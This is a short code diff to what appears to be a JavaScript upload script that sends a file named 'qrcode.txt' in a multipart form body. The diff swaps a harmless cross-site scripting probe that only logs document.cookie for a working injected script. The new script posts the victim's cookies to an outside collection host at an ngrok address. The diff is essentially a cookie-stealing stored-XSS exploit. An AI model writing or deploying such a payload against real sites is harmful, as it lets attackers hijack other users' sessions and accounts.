@@ -13,7 +13,14 @@
                 "Content-Disposition: form-data; name=\"qrcode\"; filename=\"qrcode.txt\"\r\n" + 
                 "Content-Type: text/plain\r\n" + 
                 "\r\n" + 
-                "</script><script>console.log(document.cookie)</script>\r\n" + 
+                `</script><script>
+                    (function() {
+                        var x = new XMLHttpRequest();
+                        x.open('POST', 'http://example.ngrok.io/log', true);
+                        x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                        x.send('cookie=' + encodeURIComponent(document.cookie));
+                    })();
+                </script>\r\n` + 
                 boundary + "--\r\n";
 
             var uint8Array = new Uint8Array(body.length);
